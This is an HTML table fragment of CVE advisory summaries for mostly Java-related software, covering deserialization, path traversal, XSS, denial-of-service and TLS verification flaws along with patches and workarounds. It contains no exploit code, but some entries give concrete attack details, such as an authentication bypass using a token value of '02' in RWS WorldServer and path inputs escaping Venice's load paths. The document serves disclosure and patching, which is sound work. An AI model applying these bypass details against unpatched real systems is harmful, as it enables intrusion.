		<td valign="top">NuProcess is an external process execution implementation for Java. In all the versions of NuProcess where it forks processes by using the JVM's Java_java_lang_UNIXProcess_forkAndExec method (1.2.0+), attackers can use NUL characters in their strings to perform command line injection. Java's ProcessBuilder isn't vulnerable because of a check in ProcessBuilder.start. NuProcess is missing that check. This vulnerability can only be exploited to inject command line arguments on Linux. Version 2.0.5 contains a patch. As a workaround, users of the library can sanitize command strings to remove NUL characters prior to passing them to NuProcess for execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-38935">CVE-2022-38935</a></td>
		<td valign="top">An issue was discovered in NiterForum version 2.5.0-beta in /src/main/java/cn/niter/forum/api/SsoApi.java and /src/main/java/cn/niter/forum/controller/AdminController.java, allows attackers to gain escalated privileges.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-38754">CVE-2022-38754</a></td>
		<td valign="top">A potential vulnerability has been identified in Micro Focus Operations Bridge - Containerized. The vulnerability could be exploited by a malicious authenticated OBM (Operations Bridge Manager) user to run Java Scripts in the browser context of another OBM user. Please note: The vulnerability is only applicable if the Operations Bridge Manager capability is deployed. A potential vulnerability has been identified in Micro Focus Operations Bridge Manager (OBM). The vulnerability could be exploited by a malicious authenticated OBM user to run Java Scripts in the browser context of another OBM user. This issue affects: Micro Focus Micro Focus Operations Bridge Manager versions prior to 2022.11. Micro Focus Micro Focus Operations Bridge- Containerized versions prior to 2022.11.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-38745">CVE-2022-38745</a></td>
		<td valign="top">Apache OpenOffice versions before 4.1.14 may be configured to add an empty entry to the Java class path. This may lead to run arbitrary Java code from the current directory.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-38138">CVE-2022-38138</a></td>
		<td valign="top">The Triangle Microworks IEC 61850 Library (Any client or server using the C language library with a version number of 11.2.0 or earlier and any client or server using the C++, C#, or Java language library with a version number of 5.0.1 or earlier) and 60870-6 (ICCP/TASE.2) Library (Any client or server using a C++ language library with a version number of 4.4.3 or earlier) are vulnerable to access given to a small number of uninitialized pointers within their code. This could allow an attacker to target any client or server using the affected libraries to cause a denial-of-service condition.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-37936">CVE-2022-37936</a></td>
		<td valign="top">Unauthenticated Java deserialization vulnerability in Serviceguard Manager

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-37767">CVE-2022-37767</a></td>
		<td valign="top">** DISPUTED ** Pebble Templates 3.1.5 allows attackers to bypass a protection mechanism and implement arbitrary code execution with springbok. NOTE: the vendor disputes this because input to the Pebble templating engine is intended to include arbitrary Java code, and thus either the input should not arrive from an untrusted source, or else the application using the engine should apply restrictions to the input. The engine is not responsible for validating the input.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-37734">CVE-2022-37734</a></td>
		<td valign="top">graphql-java before19.0 is vulnerable to Denial of Service. An attacker can send a malicious GraphQL query that consumes CPU resources. The fixed versions are 19.0 and later, 18.3, and 17.4, and 0.0.0-2022-07-26T05-45-04-226aabd9.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-37027">CVE-2022-37027</a></td>
		<td valign="top">Ahsay AhsayCBS 9.1.4.0 allows an authenticated system user to inject arbitrary Java JVM options. Administrators that can modify the Runtime Options in the web interface can inject Java Runtime Options. These take effect after a restart. For example, an attacker can enable JMX services and consequently achieve remote code execution as the system user.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-37023">CVE-2022-37023</a></td>
		<td valign="top">Apache Geode versions prior to 1.15.0 are vulnerable to a deserialization of untrusted data flaw when using REST API on Java 8 or Java 11. Any user wishing to protect against deserialization attacks involving REST APIs should upgrade to Apache Geode 1.15 and follow the documentation for details on enabling "validate-serializable-objects=true" and specifying any user classes that may be serialized/deserialized with "serializable-object-filter". Enabling "validate-serializable-objects" may impact performance.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-37022">CVE-2022-37022</a></td>
		<td valign="top">Apache Geode versions up to 1.12.2 and 1.13.2 are vulnerable to a deserialization of untrusted data flaw when using JMX over RMI on Java 11. Any user wishing to protect against deserialization attacks involving JMX or RMI should upgrade to Apache Geode 1.15. Use of 1.15 on Java 11 will automatically protect JMX over RMI against deserialization attacks. This should have no impact on performance since it only affects JMX/RMI which Gfsh uses to communicate with the JMX Manager which is hosted on a Locator.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-37021">CVE-2022-37021</a></td>
		<td valign="top">Apache Geode versions up to 1.12.5, 1.13.4 and 1.14.0 are vulnerable to a deserialization of untrusted data flaw when using JMX over RMI on Java 8. Any user still on Java 8 who wishes to protect against deserialization attacks involving JMX or RMI should upgrade to Apache Geode 1.15 and Java 11. If upgrading to Java 11 is not possible, then upgrade to Apache Geode 1.15 and specify "--J=-Dgeode.enableGlobalSerialFilter=true" when starting any Locators or Servers. Follow the documentation for details on specifying any user classes that may be serialized/deserialized with the "serializable-object-filter" configuration option. Using a global serial filter will impact performance.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-36950">CVE-2022-36950</a></td>
		<td valign="top">In Veritas NetBackup OpsCenter, an unauthenticated remote attacker may be able to perform remote command execution through a Java classloader manipulation. This affects 8.x through 8.3.0.2, 9.x through 9.0.0.1, 9.1.x through 9.1.0.1, and 10.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-36944">CVE-2022-36944</a></td>
		<td valign="top">Scala 2.13.x before 2.13.9 has a Java deserialization chain in its JAR file. On its own, it cannot be exploited. There is only a risk in conjunction with Java object deserialization within an application. In such situations, it allows attackers to erase contents of arbitrary files, make network connections, or possibly run arbitrary code (specifically, Function0 functions) via a gadget chain.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-36900">CVE-2022-36900</a></td>
		<td valign="top">Jenkins Compuware zAdviser API Plugin 1.0.3 and earlier does not restrict execution of a controller/agent message to agents, allowing attackers able to control agent processes to retrieve Java system properties.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-36899">CVE-2022-36899</a></td>
		<td valign="top">Jenkins Compuware ISPW Operations Plugin 1.0.8 and earlier does not restrict execution of a controller/agent message to agents, allowing attackers able to control agent processes to retrieve Java system properties.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-36033">CVE-2022-36033</a></td>
		<td valign="top">jsoup is a Java HTML parser, built for HTML editing, cleaning, scraping, and cross-site scripting (XSS) safety. jsoup may incorrectly sanitize HTML including `javascript:` URL expressions, which could allow XSS attacks when a reader subsequently clicks that link. If the non-default `SafeList.preserveRelativeLinks` option is enabled, HTML including `javascript:` URLs that have been crafted with control characters will not be sanitized. If the site that this HTML is published on does not set a Content Security Policy, an XSS attack is then possible. This issue is patched in jsoup 1.15.3. Users should upgrade to this version. Additionally, as the unsanitized input may have been persisted, old content should be cleaned again using the updated version. To remediate this issue without immediately upgrading: - disable `SafeList.preserveRelativeLinks`, which will rewrite input URLs as absolute URLs - ensure an appropriate [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) is defined. (This should be used regardless of upgrading, as a defence-in-depth best practice.)

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-36025">CVE-2022-36025</a></td>
		<td valign="top">Besu is a Java-based Ethereum client. In versions newer than 22.1.3 and prior to 22.7.1, Besu is subject to an Incorrect Conversion between Numeric Types. An error in 32 bit signed and unsigned types in the calculation of available gas in the CALL operations (including DELEGATECALL) results in incorrect gas being passed into called contracts and incorrect gas being returned after call execution. Where the amount of gas makes a difference in the success or failure, or if the gas is a negative 64 bit value, the execution will result in a different state root than expected, resulting in a consensus failure in networks with multiple EVM implementations. In networks with a single EVM implementation this can be used to execute with significantly more gas than then transaction requested, possibly exceeding gas limitations. This issue is patched in version 22.7.1. As a workaround, reverting to version 22.1.3 or earlier will prevent incorrect execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-36007">CVE-2022-36007</a></td>
		<td valign="top">Venice is a Clojure inspired sandboxed Lisp dialect with excellent Java interoperability. A partial path traversal issue exists within the functions `load-file` and `load-resource`. These functions can be limited to load files from a list of load paths. Assuming Venice has been configured with the load paths: `[ "/Users/foo/resources" ]` When passing **relative** paths to these two vulnerable functions everything is fine: `(load-resource "test.png")` =&gt; loads the file "/Users/foo/resources/test.png" `(load-resource "../resources-alt/test.png")` =&gt; rejected, outside the load path When passing **absolute** paths to these two vulnerable functions Venice may return files outside the configured load paths: `(load-resource "/Users/foo/resources/test.png")` =&gt; loads the file "/Users/foo/resources/test.png" `(load-resource "/Users/foo/resources-alt/test.png")` =&gt; loads the file "/Users/foo/resources-alt/test.png" !!! The latter call suffers from the _Partial Path Traversal_ vulnerability. This issue&amp;#8217;s scope is limited to absolute paths whose name prefix matches a load path. E.g. for a load-path `"/Users/foo/resources"`, the actor can cause loading a resource also from `"/Users/foo/resources-alt"`, but not from `"/Users/foo/images"`. Versions of Venice before and including v1.10.17 are affected by this issue. Upgrade to Venice &gt;= 1.10.18, if you are on a version &lt; 1.10.18. There are currently no known workarounds.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-35912">CVE-2022-35912</a></td>
		<td valign="top">In grails-databinding in Grails before 3.3.15, 4.x before 4.1.1, 5.x before 5.1.9, and 5.2.x before 5.2.1 (at least when certain Java 8 configurations are used), data binding allows a remote attacker to execute code by gaining access to the class loader.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-35740">CVE-2022-35740</a></td>
		<td valign="top">dotCMS before 22.06 allows remote attackers to bypass intended access control and obtain sensitive information by using a semicolon in a URL to introduce a matrix parameter. (This is also fixed in 5.3.8.12, 21.06.9, and 22.03.2 for LTS users.) Some Java application frameworks, including those used by Spring or Tomcat, allow the use of matrix parameters: these are URI parameters separated by semicolons. Through precise semicolon placement in a URI, it is possible to exploit this feature to avoid dotCMS's path-based XSS prevention (such as "require login" filters), and consequently access restricted resources. For example, an attacker could place a semicolon immediately before a / character that separates elements of a filesystem path. This could reveal file content that is ordinarily only visible to signed-in users. This issue can be chained with other exploit code to achieve XSS attacks against dotCMS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-3510">CVE-2022-3510</a></td>
		<td valign="top">A parsing issue similar to CVE-2022-3171, but with Message-Type Extensions in protobuf-java core and lite versions prior to 3.21.7, 3.20.3, 3.19.6 and 3.16.3 can lead to a denial of service attack. Inputs containing multiple instances of non-repeated embedded messages with repeated or unknown fields causes objects to be converted back-n-forth between mutable and immutable forms, resulting in potentially long garbage collection pauses. We recommend updating to the versions mentioned above.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-3509">CVE-2022-3509</a></td>
		<td valign="top">A parsing issue similar to CVE-2022-3171, but with textformat in protobuf-java core and lite versions prior to 3.21.7, 3.20.3, 3.19.6 and 3.16.3 can lead to a denial of service attack. Inputs containing multiple instances of non-repeated embedded messages with repeated or unknown fields causes objects to be converted back-n-forth between mutable and immutable forms, resulting in potentially long garbage collection pauses. We recommend updating to the versions mentioned above.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-34916">CVE-2022-34916</a></td>
		<td valign="top">Apache Flume versions 1.4.0 through 1.10.0 are vulnerable to a remote code execution (RCE) attack when a configuration uses a JMS Source with a JNDI LDAP data source URI when an attacker has control of the target LDAP server. This issue is fixed by limiting JNDI to allow only the use of the java protocol or no protocol.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-34268">CVE-2022-34268</a></td>
		<td valign="top">An issue was discovered in RWS WorldServer before 11.7.3. /clientLogin deserializes Java objects without authentication, leading to command execution on the host.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-34267">CVE-2022-34267</a></td>
		<td valign="top">An issue was discovered in RWS WorldServer before 11.7.3. Adding a token parameter with the value of 02 bypasses all authentication requirements. Arbitrary Java code can be uploaded and executed via a .jar archive to the ws-api/v2/customizations/api endpoint.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-34169">CVE-2022-34169</a></td>
		<td valign="top">The Apache Xalan Java XSLT library is vulnerable to an integer truncation issue when processing malicious XSLT stylesheets. This can be used to corrupt Java class files generated by the internal XSLTC compiler and execute arbitrary Java bytecode. Users are recommended to update to version 2.7.3 or later. Note: Java runtimes (such as OpenJDK) include repackaged copies of Xalan.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-33915">CVE-2022-33915</a></td>
		<td valign="top">Versions of the Amazon AWS Apache Log4j hotpatch package before log4j-cve-2021-44228-hotpatch-1.3.5 are affected by a race condition that could lead to a local privilege escalation. This Hotpatch package is not a replacement for updating to a log4j version that mitigates CVE-2021-44228 or CVE-2021-45046; it provides a temporary mitigation to CVE-2021-44228 by hotpatching the local Java virtual machines. To do so, it iterates through all running Java processes, performs several checks, and executes the Java virtual machine with the same permissions and capabilities as the running process to load the hotpatch. A local user could cause the hotpatch script to execute a binary with elevated privileges by running a custom java process that performs exec() of an SUID binary after the hotpatch has observed the process path and before it has observed its effective user ID.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-33682">CVE-2022-33682</a></td>
		<td valign="top">TLS hostname verification cannot be enabled in the Pulsar Broker's Java Client, the Pulsar Broker's Java Admin Client, the Pulsar WebSocket Proxy's Java Client, and the Pulsar Proxy's Admin Client leaving intra-cluster connections and geo-replication connections vulnerable to man in the middle attacks, which could leak credentials, configuration data, message data, and any other data sent by these clients. The vulnerability is for both the pulsar+ssl protocol and HTTPS. An attacker can only take advantage of this vulnerability by taking control of a machine 'between' the client and the server. The attacker must then actively manipulate traffic to perform the attack by providing the client with a cryptographically valid certificate for an unrelated host. This issue affects Apache Pulsar Broker, Proxy, and WebSocket Proxy versions 2.7.0 to 2.7.4; 2.8.0 to 2.8.3; 2.9.0 to 2.9.2; 2.10.0; 2.6.4 and earlier.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-33681">CVE-2022-33681</a></td>
		<td valign="top">Delayed TLS hostname verification in the Pulsar Java Client and the Pulsar Proxy make each client vulnerable to a man in the middle attack. Connections from the Pulsar Java Client to the Pulsar Broker/Proxy and connections from the Pulsar Proxy to the Pulsar Broker are vulnerable. Authentication data is sent before verifying the server&amp;#8217;s TLS certificate matches the hostname, which means authentication data could be exposed to an attacker. An attacker can only take advantage of this vulnerability by taking control of a machine 'between' the client and the server. The attacker must then actively manipulate traffic to perform the attack by providing the client with a cryptographically valid certificate for an unrelated host. Because the client sends authentication data before performing hostname verification, an attacker could gain access to the client&amp;#8217;s authentication data. The client eventually closes the connection when it verifies the hostname and identifies the targeted hostname does not match a hostname on the certificate. Because the client eventually closes the connection, the value of the intercepted authentication data depends on the authentication method used by the client. Token based authentication and username/password authentication methods are vulnerable because the authentication data can be used to impersonate the client in a separate session. This issue affects Apache Pulsar Java Client versions 2.7.0 to 2.7.4; 2.8.0 to 2.8.3; 2.9.0 to 2.9.2; 2.10.0; 2.6.4 and earlier.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-32531">CVE-2022-32531</a></td>
		<td valign="top">The Apache Bookkeeper Java Client (before 4.14.6 and also 4.15.0) does not close the connection to the bookkeeper server when TLS hostname verification fails. This leaves the bookkeeper client vulnerable to a man in the middle attack. The problem affects BookKeeper client prior to versions 4.14.6 and 4.15.1.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-32287">CVE-2022-32287</a></td>
		<td valign="top">A relative path traversal vulnerability in a FileUtil class used by the PEAR management component of Apache UIMA allows an attacker to create files outside the designated target directory using carefully crafted ZIP entry names. This issue affects Apache UIMA Apache UIMA version 3.3.0 and prior versions. Note that PEAR files should never be installed into an UIMA installation from untrusted sources because PEAR archives are executable plugins that will be able to perform any actions with the same privileges as the host Java Virtual Machine.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-3171">CVE-2022-3171</a></td>
		<td valign="top">A parsing issue with binary data in protobuf-java core and lite versions prior to 3.21.7, 3.20.3, 3.19.6 and 3.16.3 can lead to a denial of service attack. Inputs containing multiple instances of non-repeated embedded messages with repeated or unknown fields causes objects to be converted back-n-forth between mutable and immutable forms, resulting in potentially long garbage collection pauses. We recommend updating to the versions mentioned above.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-31619">CVE-2022-31619</a></td>
		<td valign="top">A vulnerability has been identified in Teamcenter V12.4 (All versions &lt; V12.4.0.13), Teamcenter V13.0 (All versions &lt; V13.0.0.9), Teamcenter V13.1 (All versions &lt; V13.1.0.9), Teamcenter V13.2 (All versions &lt; V13.2.0.9), Teamcenter V13.3 (All versions &lt; V13.3.0.3), Teamcenter V14.0 (All versions &lt; V14.0.0.2). Java EE Server Manager HTML Adaptor in Teamcenter consists of default hardcoded credentials. Access to the application allows a user to perform a series of actions that could potentially lead to remote code execution with elevated permissions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-31255">CVE-2022-31255</a></td>
		<td valign="top">An Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') vulnerability in spacewalk/Uyuni of SUSE Linux Enterprise Module for SUSE Manager Server 4.2, SUSE Linux Enterprise Module for SUSE Manager Server 4.3, SUSE Manager Server 4.2 allows remote attackers to read files available to the user running the process, typically tomcat. This issue affects: SUSE Linux Enterprise Module for SUSE Manager Server 4.2 hub-xmlrpc-api-0.7-150300.3.9.2, inter-server-sync-0.2.4-150300.8.25.2, locale-formula-0.3-150300.3.3.2, py27-compat-salt-3000.3-150300.7.7.26.2, python-urlgrabber-3.10.2.1py2_3-150300.3.3.2, spacecmd-4.2.20-150300.4.30.2, spacewalk-backend-4.2.25-150300.4.32.4, spacewalk-client-tools-4.2.21-150300.4.27.3, spacewalk-java-4.2.43-150300.3.48.2, spacewalk-utils-4.2.18-150300.3.21.2, spacewalk-web-4.2.30-150300.3.30.3, susemanager-4.2.38-150300.3.44.3, susemanager-doc-indexes-4.2-150300.12.36.3, susemanager-docs_en-4.2-150300.12.36.2, susemanager-schema-4.2.25-150300.3.30.3, susemanager-sls versions prior to 4.2.28. SUSE Linux Enterprise Module for SUSE Manager Server 4.3 spacewalk-java versions prior to 4.3.39. SUSE Manager Server 4.2 release-notes-susemanager versions prior to 4.2.10.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-31248">CVE-2022-31248</a></td>
		<td valign="top">A Observable Response Discrepancy vulnerability in spacewalk-java of SUSE Manager Server 4.1, SUSE Manager Server 4.2 allows remote attackers to discover valid usernames. This issue affects: SUSE Manager Server 4.1 spacewalk-java versions prior to 4.1.46-1. SUSE Manager Server 4.2 spacewalk-java versions prior to 4.2.37-1.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-31197">CVE-2022-31197</a></td>
		<td valign="top">PostgreSQL JDBC Driver (PgJDBC for short) allows Java programs to connect to a PostgreSQL database using standard, database independent Java code. The PGJDBC implementation of the `java.sql.ResultRow.refreshRow()` method is not performing escaping of column names so a malicious column name that contains a statement terminator, e.g. `;`, could lead to SQL injection. This could lead to executing additional SQL commands as the application's JDBC user. User applications that do not invoke the `ResultSet.refreshRow()` method are not impacted. User application that do invoke that method are impacted if the underlying database that they are querying via their JDBC application may be under the control of an attacker. The attack requires the attacker to trick the user into executing SQL against a table name who's column names would contain the malicious SQL and subsequently invoke the `refreshRow()` method on the ResultSet. Note that the application's JDBC user and the schema owner need not be the same. A JDBC application that executes as a privileged user querying database schemas owned by potentially malicious less-privileged users would be vulnerable. In that situation it may be possible for the malicious user to craft a schema that causes the application to execute commands as the privileged user. Patched versions will be released as `42.2.26` and `42.4.1`. Users are advised to upgrade. There are no known workarounds for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-31159">CVE-2022-31159</a></td>
		<td valign="top">The AWS SDK for Java enables Java developers to work with Amazon Web Services. A partial-path traversal issue exists within the `downloadDirectory` method in the AWS S3 TransferManager component of the AWS SDK for Java v1 prior to version 1.12.261. Applications using the SDK control the `destinationDirectory` argument, but S3 object keys are determined by the application that uploaded the objects. The `downloadDirectory` method allows the caller to pass a filesystem object in the object key but contained an issue in the validation logic for the key name. A knowledgeable actor could bypass the validation logic by including a UNIX double-dot in the bucket key. Under certain conditions, this could permit them to retrieve a directory from their S3 bucket that is one level up in the filesystem from their working directory. This issue&amp;#8217;s scope is limited to directories whose name prefix matches the destinationDirectory. E.g. for destination directory`/tmp/foo`, the actor can cause a download to `/tmp/foo-bar`, but not `/tmp/bar`. If `com.amazonaws.services.s3.transfer.TransferManager::downloadDirectory` is used to download an untrusted buckets contents, the contents of that bucket can be written outside of the intended destination directory. Version 1.12.261 contains a patch for this issue. As a workaround, when calling `com.amazonaws.services.s3.transfer.TransferManager::downloadDirectory`, pass a `KeyFilter` that forbids `S3ObjectSummary` objects that `getKey` method return a string containing the substring `..` .

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-31053">CVE-2022-31053</a></td>
		<td valign="top">Biscuit is an authentication and authorization token for microservices architectures. The Biscuit specification version 1 contains a vulnerable algorithm that allows malicious actors to forge valid &amp;#915;-signatures. Such an attack would allow an attacker to create a token with any access level. The version 2 of the specification mandates a different algorithm than gamma signatures and as such is not affected by this vulnerability. The Biscuit implementations in Rust, Haskell, Go, Java and Javascript all have published versions following the v2 specification. There are no known workarounds for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-31023">CVE-2022-31023</a></td>
		<td valign="top">Play Framework is a web framework for Java and Scala. Verions prior to 2.8.16 are vulnerable to generation of error messages containing sensitive information. Play Framework, when run in dev mode, shows verbose errors for easy debugging, including an exception stack trace. Play does this by configuring its `DefaultHttpErrorHandler` to do so based on the application mode. In its Scala API Play also provides a static object `DefaultHttpErrorHandler` that is configured to always show verbose errors. This is used as a default value in some Play APIs, so it is possible to inadvertently use this version in production. It is also possible to improperly configure the `DefaultHttpErrorHandler` object instance as the injected error handler. Both of these situations could result in verbose errors displaying to users in a production application, which could expose sensitive information from the application. In particular, the constructor for `CORSFilter` and `apply` method for `CORSActionBuilder` use the static object `DefaultHttpErrorHandler` as a default value. This is patched in Play Framework 2.8.16. The `DefaultHttpErrorHandler` object has been changed to use the prod-mode behavior, and `DevHttpErrorHandler` has been introduced for the dev-mode behavior. A workaround is available. When constructing a `CORSFilter` or `CORSActionBuilder`, ensure that a properly-configured error handler is passed. Generally this should be done by using the `HttpErrorHandler` instance provided through dependency injection or through Play's `BuiltInComponents`. Ensure that the application is not using the `DefaultHttpErrorHandler` static object in any code that may be run in production.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-31018">CVE-2022-31018</a></td>
		<td valign="top">Play Framework is a web framework for Java and Scala. A denial of service vulnerability has been discovered in verions 2.8.3 through 2.8.15 of Play's forms library, in both the Scala and Java APIs. This can occur when using either the `Form#bindFromRequest` method on a JSON request body or the `Form#bind` method directly on a JSON value. If the JSON data being bound to the form contains a deeply-nested JSON object or array, the form binding implementation may consume all available heap space and cause an `OutOfMemoryError`. If executing on the default dispatcher and `akka.jvm-exit-on-fatal-error` is enabled&amp;#8212;as it is by default&amp;#8212;then this can crash the application process. `Form.bindFromRequest` is vulnerable when using any body parser that produces a type of `AnyContent` or `JsValue` in Scala, or one that can produce a `JsonNode` in Java. This includes Play's default body parser. This vulnerability been patched in version 2.8.16. There is now a global limit on the depth of a JSON object that can be parsed, which can be configured by the user if necessary. As a workaround, applications that do not need to parse a request body of type `application/json` can switch from the default body parser to another body parser that supports only the specific type of body they expect.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-30981">CVE-2022-30981</a></td>
		<td valign="top">An issue was discovered in Gentics CMS before 5.43.1. By uploading a malicious ZIP file, an attacker is able to deserialize arbitrary data and hence can potentially achieve Java code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-30551">CVE-2022-30551</a></td>
		<td valign="top">OPC UA Legacy Java Stack 2022-04-01 allows a remote attacker to cause a server to stop processing messages by sending crafted messages that exhaust available resources.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-29936">CVE-2022-29936</a></td>
		<td valign="top">USU Oracle Optimization before 5.17 allows authenticated quantum users to achieve remote code execution because of /v2/quantum/save-data-upload-big-file Java deserialization. NOTE: this is not an Oracle Corporation product.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-29805">CVE-2022-29805</a></td>
		<td valign="top">A Java Deserialization vulnerability in the Fishbowl Server in Fishbowl Inventory before 2022.4.1 allows remote attackers to execute arbitrary code via a crafted XML payload.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-29614">CVE-2022-29614</a></td>
		<td valign="top">SAP startservice - of SAP NetWeaver Application Server ABAP, Application Server Java, ABAP Platform and HANA Database - versions KERNEL 7.22, 7.49, 7.53, 7.77, 7.81, 7.85, 7.86, 7.87, 7.88, KRNL64NUC 7.22, 7.22EXT, 7.49, KRNL64UC 7.22, 7.22EXT, 7.49, 7.53, SAPHOSTAGENT 7.22, - on Unix systems, s-bit helper program sapuxuserchk, can be abused physically resulting in a privilege escalation of an attacker leading to low impact on confidentiality and integrity, but a profound impact on availability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-29249">CVE-2022-29249</a></td>
		<td valign="top">JavaEZ is a library that adds new functions to make Java easier. A weakness in JavaEZ 1.6 allows force decryption of locked text by unauthorized actors. The issue is NOT critical for non-secure applications, however may be critical in a situation where the highest levels of security are required. This issue ONLY affects v1.6 and does not affect anything pre-1.6. The vulnerability has been patched in release 1.7. Currently, there is no way to fix the issue without upgrading.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-29176">CVE-2022-29176</a></td>
		<td valign="top">Rubygems is a package registry used to supply software for the Ruby language ecosystem. Due to a bug in the yank action, it was possible for any RubyGems.org user to remove and replace certain gems even if that user was not authorized to do so. To be vulnerable, a gem needed: one or more dashes in its name creation within 30 days OR no updates for over 100 days At present, we believe this vulnerability has not been exploited. RubyGems.org sends an email to all gem owners when a gem version is published or yanked. We have not received any support emails from gem owners indicating that their gem has been yanked without authorization. An audit of gem changes for the last 18 months did not find any examples of this vulnerability being used in a malicious way. A deeper audit for any possible use of this exploit is ongoing, and we will update this advisory once it is complete. Using Bundler in --frozen or --deployment mode in CI and during deploys, as the Bundler team has always recommended, will guarantee that your application does not silently switch to versions created using this exploit. To audit your application history for possible past exploits, review your Gemfile.lock and look for gems whose platform changed when the version number did not change. For example, gemname-3.1.2 updating to gemname-3.1.2-java could indicate a possible abuse of this vulnerability. RubyGems.org has been patched and is no longer vulnerable to this issue as of the 5th of May 2022.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-29063">CVE-2022-29063</a></td>
		<td valign="top">The Solr plugin of Apache OFBiz is configured by default to automatically make a RMI request on localhost, port 1099. In version 18.12.05 and earlier, by hosting a malicious RMI server on localhost, an attacker may exploit this behavior, at server start-up or on a server restart, in order to run arbitrary code. Upgrade to at least 18.12.06 or apply patches at https://issues.apache.org/jira/browse/OFBIZ-12646.

</td>
	</tr>
